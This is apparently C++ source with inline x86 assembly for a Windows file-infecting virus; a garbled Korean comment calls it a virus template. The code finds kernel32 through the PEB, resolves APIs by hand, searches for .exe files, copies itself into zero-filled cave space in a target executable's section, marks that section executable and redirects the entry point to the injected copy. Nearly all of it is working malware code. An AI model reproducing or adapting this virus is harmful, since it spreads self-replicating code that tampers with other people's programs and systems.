// ���̷��� ���ø�.cpp : �ܼ� ���� ���α׷��� ���� �������� �����մϴ�.
//

#include "stdafx.h"
#include <Windows.h>
char *test_str = "ang?";
char *test_str2 = "aMG?";
char test_dest[1000] ="��";
__declspec(naked) int func()
{
#define __REWINDING_ESP -4
#define __REWINDING_EBP -8
#define __REWINDING_EIP -12
#define __ERROR_EIP -16
#define __PBUFFER_SIZE 16
	
	__asm
	{
CODE_START:
		call CODE_EIP_GETTER
		push ebp
		mov ebp, esp
		sub esp, __LOCAL_SIZE

	}
	char collidingPreventBuffer[__PBUFFER_SIZE];//ebp-4, ebp-8, ebp-12, ebp-16�� "�����"������ ���������� �浹�ϴ� ���� �����ش�. 

	int myCodeStart; //�츮 �ڵ� ������
	int myCodeSize;
	int myCodeBase; // �츮 �ڵ� MZ
	int kernelBase; //kernel32.dll�� MZ
	int user32Base; //user32.dll�� MZ
	__asm mov myCodeStart, eax // �ڵ� ������ �ֱ�
	__asm
	{
		mov ecx, offset CODE_END
		sub ecx, offset CODE_START
		mov myCodeSize, ecx

	}
	printf("code size:%d",  myCodeSize); 
//makeStrings
	
	char strkernel32dll[16];
	char strLoadLibraryA[16];
	char struser32_dll[12];
	char strProgram_Files[16];
	char strProgram_Files__x86_[20];
	char strCcb[4];
	char strDcb[4];
	char stra_exe[8];
	char strGetProcAddress[16];
	char strFindFirstFileA[16];
	char strFindNextFileA[16];
	char strCreateFileA[12];
	char strReadFile[12];
	char strWriteFile[12];
	char strGetFileSize[12];
	char strCreateFileMappingA[20];
	char strMapViewOfFile[16];
	char strUnmapViewOfFile[16];
	char strCloseHandle[12];
	char strFindClose[12];
	char strFreeLibrary[12];
	char strBeep[8];
	char strMessageBoxA[12];
	
	__asm
	{
		push ebx
		mov ebx, esp

		jmp STRING_STUB_END
#define DB(x) __asm __emit x
STRING_STUB:
		LABEL_strGetProcAddress:
		DB('G');
		DB('e');
		DB('t');
		DB('P');
		DB('r');
		DB('o');
		DB('c');
		DB('A');
		DB('d');
		DB('d');
		DB('r');
		DB('e');
		DB('s');
		DB('s');
		DB(0x00);


		LABEL_strkernel32_dll:
		DB('k');
		DB('e');
		DB('r');
		DB('n');
		DB('e');
		DB('l');
		DB('3');
		DB('2');
		DB('.');
		DB('d');
		DB('l');
		DB('l');
		DB(0x00);


		LABEL_strLoadLibraryA:
		DB('L');
		DB('o');
		DB('a');
		DB('d');
		DB('L');
		DB('i');
		DB('b');
		DB('r');
		DB('a');
		DB('r');
		DB('y');
		DB('A');
		DB(0x00);


		LABEL_struser32_dll:
		DB('u');
		DB('s');
		DB('e');
		DB('r');
		DB('3');
		DB('2');
		DB('.');
		DB('d');
		DB('l');
		DB('l');
		DB(0x00);


		LABEL_strFindFirstFileA:
		DB('F');
		DB('i');
		DB('n');
		DB('d');
		DB('F');
		DB('i');
		DB('r');
		DB('s');
		DB('t');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB('A');
		DB(0x00);


		LABEL_strFindNextFileA:
		DB('F');
		DB('i');
		DB('n');
		DB('d');
		DB('N');
		DB('e');
		DB('x');
		DB('t');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB('A');
		DB(0x00);


		LABEL_strCreateFileA:
		DB('C');
		DB('r');
		DB('e');
		DB('a');
		DB('t');
		DB('e');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB('A');
		DB(0x00);


		LABEL_strReadFile:
		DB('R');
		DB('e');
		DB('a');
		DB('d');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB(0x00);


		LABEL_strWriteFile:
		DB('W');
		DB('r');
		DB('i');
		DB('t');
		DB('e');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB(0x00);


		LABEL_strGetFileSize:
		DB('G');
		DB('e');
		DB('t');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB('S');
		DB('i');
		DB('z');
		DB('e');
		DB(0x00);


		LABEL_strCreateFileMappingA:
		DB('C');
		DB('r');
		DB('e');
		DB('a');
		DB('t');
		DB('e');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB('M');
		DB('a');
		DB('p');
		DB('p');
		DB('i');
		DB('n');
		DB('g');
		DB('A');
		DB(0x00);


		LABEL_strMapViewOfFile:
		DB('M');
		DB('a');
		DB('p');
		DB('V');
		DB('i');
		DB('e');
		DB('w');
		DB('O');
		DB('f');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB(0x00);


		LABEL_strUnmapViewOfFile:
		DB('U');
		DB('n');
		DB('m');
		DB('a');
		DB('p');
		DB('V');
		DB('i');
		DB('e');
		DB('w');
		DB('O');
		DB('f');
		DB('F');
		DB('i');
		DB('l');
		DB('e');
		DB(0x00);


		LABEL_strCloseHandle:
		DB('C');
		DB('l');
		DB('o');
		DB('s');
		DB('e');
		DB('H');
		DB('a');
		DB('n');
		DB('d');
		DB('l');
		DB('e');
		DB(0x00);


		LABEL_strFindClose:
		DB('F');
		DB('i');
		DB('n');
		DB('d');
		DB('C');
		DB('l');
		DB('o');
		DB('s');
		DB('e');
		DB(0x00);


		LABEL_strFreeLibrary:
		DB('F');
		DB('r');
		DB('e');
		DB('e');
		DB('L');
		DB('i');
		DB('b');
		DB('r');
		DB('a');
		DB('r');
		DB('y');
		DB(0x00);


		LABEL_strMessageBoxA:
		DB('M');
		DB('e');
		DB('s');
		DB('s');
		DB('a');
		DB('g');
		DB('e');
		DB('B');
		DB('o');
		DB('x');
		DB('A');
		DB(0x00);
		/*
		lea esp, strGetProcAddress
		add esp, 16
		push 0x7373
		push 0x65726464
		push 0x41636F72
		push 0x50746547
		

		lea esp, strkernel32dll
		add esp, 16
		push 0x0
		push 0x6C6C642E
		push 0x32336C65
		push 0x6E72656B

		lea esp, strLoadLibraryA
		add esp, 16
		push 0x0
		push 0x41797261
		push 0x7262694C
		push 0x64616F4C

		lea esp, struser32_dll
		add esp, 12
		push 0x6C6C
		push 0x642E3233
		push 0x72657375
		lea esp, stra_exe
		add esp, 8
		push 0x65
		push 0x78652E2A
		lea esp, strGetProcAddress
		add esp, 16
		push 0x7373
		push 0x65726464
		push 0x41636F72
		push 0x50746547

		lea esp, strFindFirstFileA
		add esp, 16
		push 0x4165
		push 0x6C694674
		push 0x73726946
		push 0x646E6946

		lea esp, strFindNextFileA
		add esp, 16
		push 0x41
		push 0x656C6946
		push 0x7478654E
		push 0x646E6946

		lea esp, strCreateFileA
		add esp, 12
		push 0x41656C
		push 0x69466574
		push 0x61657243

		lea esp, strReadFile
		add esp, 12
		push 0x0
		push 0x656C6946
		push 0x64616552

		lea esp, strWriteFile
		add esp, 12
		push 0x65
		push 0x6C694665
		push 0x74697257

		lea esp, strGetFileSize
		add esp, 12
		push 0x657A69
		push 0x53656C69
		push 0x46746547

		lea esp, strCreateFileMappingA
		add esp, 20
		push 0x4167
		push 0x6E697070
		push 0x614D656C
		push 0x69466574
		push 0x61657243

		lea esp, strMapViewOfFile
		add esp, 16
		push 0x65
		push 0x6C694666
		push 0x4F776569
		push 0x5670614D

		lea esp, strUnmapViewOfFile
		add esp, 16
		push 0x656C69
		push 0x46664F77
		push 0x65695670
		push 0x616D6E55

		lea esp, strCloseHandle
		add esp, 12
		push 0x656C64
		push 0x6E614865
		push 0x736F6C43

		lea esp, strFindClose
		add esp, 12
		push 0x65
		push 0x736F6C43
		push 0x646E6946

		lea esp, strFreeLibrary
		add esp, 12
		push 0x797261
		push 0x7262694C
		push 0x65657246

		lea esp, strBeep
		add esp, 8
		push 0x0
		push 0x70656542

		lea esp, strMessageBoxA
		add esp, 12
		push 0x41786F
		push 0x42656761
		push 0x7373654D

		mov esp, ebx
		pop ebx
		*/
STRING_STUB_END:
	
}
	
	int fnLoadLibraryA;
	int fnGetProcAddress;
	__asm
	{

		mov edi, myCodeStart
		sub edi, offset CODE_START; edi : mycodeStart - offset CODE_START
		lea edx, [edi + LABEL_strGetProcAddress]
		push edx
		lea eax, [edi + LABEL_strkernel32_dll]
		push eax
		push myCodeStart
		call GetKernelBase
		add esp,12
		mov kernelBase, eax

		push kernelBase
		call GetGetProcAddress
		add esp, 4
		
		mov fnGetProcAddress, eax
	}
	//Get LoadLibraryA
	__asm
	{
		mov ebx, kernelBase; ebx is base now
		
		lea eax, [edi + LABEL_strLoadLibraryA]
		push eax
		push ebx
		call fnGetProcAddress
		mov fnLoadLibraryA, eax
	}

	//set functions
	int fnFindFirstFileA;
	int fnFindNextFileA;
	int fnCreateFileA;
	int fnReadFile;
	int fnWriteFile;
	int fnGetFileSize;
	int fnCreateFileMappingA;
	int fnMapViewOfFile;
	int fnUnmapViewOfFile;
	int fnCloseHandle;
	int fnFindClose;
	int fnFreeLibrary;
	int fnBeep;
	int fnMessageBoxA;	

	
	__asm
	{
	mov ebx, kernelBase

	lea eax, [edi +LABEL_strFindFirstFileA]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnFindFirstFileA,eax

	lea eax, [edi +LABEL_strFindNextFileA]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnFindNextFileA,eax

	lea eax, [edi +LABEL_strCreateFileA]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnCreateFileA,eax

	lea eax, [edi +LABEL_strReadFile]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnReadFile,eax

	lea eax, [edi +LABEL_strWriteFile]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnWriteFile,eax

	lea eax, [edi +LABEL_strGetFileSize]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnGetFileSize,eax

	lea eax, [edi +LABEL_strCreateFileMappingA]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnCreateFileMappingA,eax

	lea eax, [edi +LABEL_strMapViewOfFile]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnMapViewOfFile,eax

	lea eax, [edi +LABEL_strUnmapViewOfFile]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnUnmapViewOfFile,eax

	lea eax, [edi +LABEL_strCloseHandle]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnCloseHandle,eax

	lea eax, [edi +LABEL_strFindClose]
	push eax
	push ebx
	call fnGetProcAddress
	mov fnFindClose,eax

	/*
	lea eax, strFreeLibrary
	push eax
	push ebx
	call fnGetProcAddress
	mov fnFreeLibrary,eax

	lea eax, strBeep
	push eax
	push ebx
	call fnGetProcAddress
	mov fnBeep,eax
	*/
	}
	__asm
	{
		lea eax, [edi +LABEL_struser32_dll]
		push eax
		call fnLoadLibraryA
		mov user32Base, eax
	}
	__asm
	{
		mov ebx, user32Base

		lea eax, [edi +LABEL_strMessageBoxA]
		push eax
		push ebx
		call fnGetProcAddress
		mov fnMessageBoxA,eax
	}
	//file searching
	
	
	//�ϳ��� �������Ѻ���
	WIN32_FIND_DATAA findData;
	HANDLE findHandle;
	__asm
	{
		lea eax, findData
		push eax
		lea eax, stra_exe
		push eax
		mov eax, fnFindFirstFileA
		call eax
		lea ecx, findData
		mov findHandle,eax;
	}
	

	HANDLE hFile, hFileMapping;
	int victimBase;
	int victimSectionNum;

	int desiredSize;	

	int emptySpaceAddr;
	int emptySpaceSize;
	int emptySpaceSectionHeader;
	__asm
	{
		;SEH
		mov ecx, offset BAD_EXIT
		sub ecx, offset CODE_START
		add ecx, myCodeStart

		mov eax, offset SEH_HANDLER
		sub eax, offset CODE_START
		add eax, myCodeStart
		push eax
		push dword ptr fs:[0]
		mov fs:[0], esp

		mov [ebp+__REWINDING_EBP], ebp
		mov [ebp+__REWINDING_ESP], esp
		mov [ebp+__REWINDING_EIP], ecx

		xor ecx, ecx
		push ecx ; 0
		push FILE_ATTRIBUTE_NORMAL
		push OPEN_EXISTING
		push ecx ;0
		push ecx ; 0
		push GENERIC_READ | GENERIC_WRITE
		lea eax, [findData + 44]
		push eax
		call fnCreateFileA
		mov hFile, eax

		xor ecx, ecx
		push ecx
		push ecx
		push ecx
		push PAGE_READWRITE
		push ecx
		push hFile
		call fnCreateFileMappingA
		mov hFileMapping, eax
		
		xor ecx, ecx
		push ecx
		push ecx
		push ecx
		push FILE_MAP_ALL_ACCESS
		push hFileMapping
		call fnMapViewOfFile
		mov victimBase, eax
	}
	

	__asm
	{
		mov ebx, victimBase
		mov eax,[ebx + 3Ch]
		add eax, ebx


		mov dx, [eax + 6]; section number
		movzx ecx, dx
		mov victimSectionNum, ecx
		
		mov dx,[eax + 20] ;size of optional Header
		movzx edx, dx

		mov esi, eax
		add esi, 24
		add esi, edx

		mov eax, myCodeSize
		add eax, 8
		mov desiredSize, eax 

		mov ecx, victimSectionNum
		jmp EMPTY_SEARCH_TRIGGER
EMPTY_SEARCH_START:
		add esi, 40
EMPTY_SEARCH_TRIGGER:
		push ecx ; section num

		mov ecx,[esi + 16]
		mov edi, [esi + 20]
		add edi, victimBase
EMPTY_SEARCH_INNER_LOOP_START:
		xor eax,eax
		cld
		repnz scasb
		test ecx,ecx ; ecx�� 0�� �Ǿ���?
		jz EMPTY_SEARCH_CONTINUE ;continue
		
		dec edi
		inc ecx

		push edi
		repz scasb 
		mov eax, edi
		pop edx
		sub eax, edx
		dec eax ; rep Ư���� -1�������

		cmp eax, desiredSize
		jl EMPTY_SEARCH_REGISTER_END
		;register emptySpace
		mov emptySpaceAddr, edx
		mov emptySpaceSize, eax;
		mov emptySpaceSectionHeader,esi;

		pop ecx
		jmp EMPTY_SEARCH_END; break

EMPTY_SEARCH_REGISTER_END:
		test ecx,ecx
		jz EMPTY_SEARCH_CONTINUE

		jmp EMPTY_SEARCH_INNER_LOOP_START
		
EMPTY_SEARCH_CONTINUE:
		pop ecx ;section num
		dec ecx
		test ecx,ecx
		jnz EMPTY_SEARCH_START
EMPTY_SEARCH_END:

	}
	//copy ME To the victim
	int fileStartAddr;
	int OEP;
	__asm
	{
		mov eax, emptySpaceAddr
		inc eax ;null���ڸ�ŭ�� ������ �տ� �־��ش�
		mov	fileStartAddr, eax
		
		cld
		mov edi, fileStartAddr
		mov esi, myCodeStart
		mov ecx, myCodeSize

		rep movsb


		mov edx, fileStartAddr;file offset
		sub edx, victimBase

		mov eax, emptySpaceSectionHeader
		or dword ptr [eax + 36], IMAGE_SCN_MEM_EXECUTE

		mov ecx, [eax + 12]; virtualAdress
		sub ecx, [eax + 20]; pointerToRawData
		add edx, ecx;

		mov ebx, victimBase
		mov eax, [ebx + 3Ch]
		add eax, ebx

		mov ecx , [eax + 40];AdressOfEntryPoint pointer
		;mov OEP, ecx
		mov [eax + 40], edx

		sub ecx, esi
		sub ecx, 5
		
		mov al, 0xE9 
		stosb
		mov eax, ecx
		stosd

	}
	__asm
	{
		push victimBase
		call fnUnmapViewOfFile

		mov ecx, fnCloseHandle
		push hFileMapping
		call ecx
		push hFile
		call ecx
	}
	IMAGE_SECTION_HEADER h;
	__asm
	{
BAD_EXIT:
		;SEH ����
		pop dword ptr fs:[0]
		add esp,4
	}

	//DO SOMETHING TO WANT TO DO
	__asm
	{
		push 0
		push kernelBase
		push kernelBase
		push 0
		call fnMessageBoxA
	}
	__asm jmp CLEAR_CODE


//utillity Functions
	{
		__asm
		{
	GetGetProcAddress: ; arg0 : kernel32.dll�� �ּ�
			push ebp
			mov ebp,esp
			sub esp, __LOCAL_SIZE
			push ebx
			push esi
		}
		
		__asm
		{
			mov ebx, [ebp+8]
			
			mov eax, ebx
			mov eax, [eax+3Ch]
			
			mov eax, [eax+ebx+78h]
			add eax, ebx

			mov esi,eax

			mov eax, [eax +20h]
			add eax, ebx

			xor ecx,ecx
			jmp GetGetProcAddress_TRIGGER
GetGetProcAddress_LOOP_START:
			inc ecx
GetGetProcAddress_TRIGGER:
			mov edx, [eax + 4*ecx]
			add edx, ebx

			cmp dword ptr [edx], 0x50746547
			jnz GetGetProcAddress_LOOP_START
			cmp dword ptr [edx+4], 0x41636F72
			jnz GetGetProcAddress_LOOP_START
			cmp dword ptr [edx+8], 0x65726464
			jnz GetGetProcAddress_LOOP_START

			mov eax, [esi+24h]
			add eax, ebx

			movzx ecx, word ptr[eax+2*ecx]
			add eax, ebx

			mov eax, [esi +1Ch]
			add eax, ebx

			mov eax, [eax + 4*ecx]
			add eax, ebx

		}
		__asm
		{
			pop esi
			pop ebx
			mov esp, ebp
			pop ebp
			ret
		}
	}
	__asm 
	{
GetKernelBase: ; kernel32.dll�� ���̽� ���, arg0: ���� �ڵ��� ������ arg1 : kernel32.dll�� string  out eax: kernel base
		; xor eax, eax               ;clear eax
		mov eax, fs:[ 0x30 ]       ; get a pointer to the PEB
		mov eax, [ eax + 0x0C ]    ; get PEB->Ldr
		mov eax, [ eax + 0x14 ]    ; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
		mov eax, [ eax ]           ; get the next entry (2nd entry)
		mov eax, [ eax ]           ; get the next entry (3rd entry)
		mov eax, [ eax + 0x10 ]    ; get the 3rd entries base address (kernel32.dll)
		ret
		
	}

	__asm
	{
CODE_EIP_GETTER:
		pop ecx
		mov eax, ecx
		sub eax,5 ; call xxxxxx �� �ڵ� ������ 5
		jmp ecx
	}


	

//SEH Handler
SEH_HANDLER:
	__asm
	{
		push ebp
		mov ebp, esp
		sub esp, __LOCAL_SIZE
	}
	_CONTEXT *pContext;
	int ebpInError;
	int eipInError;
	int rewindingEbp;
	int rewindingEsp;
	int rewindingEip;

	__asm { 
		mov eax, [ebp + 16] ; context
		mov pContext, eax
		
		lea ecx, pContext
		mov edx, ebp
			sub edx, ecx
	}
	ebpInError = pContext->Ebp;
	eipInError = pContext->Eip;
	__asm
	{
		mov ecx, ebpInError
		mov eax,[ecx+__REWINDING_EBP]
		mov rewindingEbp, eax

		mov eax, [ecx + __REWINDING_ESP]
		mov rewindingEsp, eax

		mov eax, [ecx + __REWINDING_EIP]
		mov rewindingEip, eax
		
		mov edx, eipInError
		mov [ecx + __ERROR_EIP], edx
	}
	pContext->Eip = rewindingEip;
	pContext->Ebp = rewindingEbp;
	pContext->Esp = rewindingEsp;
	__asm
	{
		mov esp, ebp
		pop ebp

		xor eax,eax
		ret

	}

	__asm
	{
CLEAR_CODE:
		add esp, __LOCAL_SIZE
		mov esp, ebp
		pop ebp
		xor eax,eax
CODE_END:
		ret
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	func();
	return 0;
}

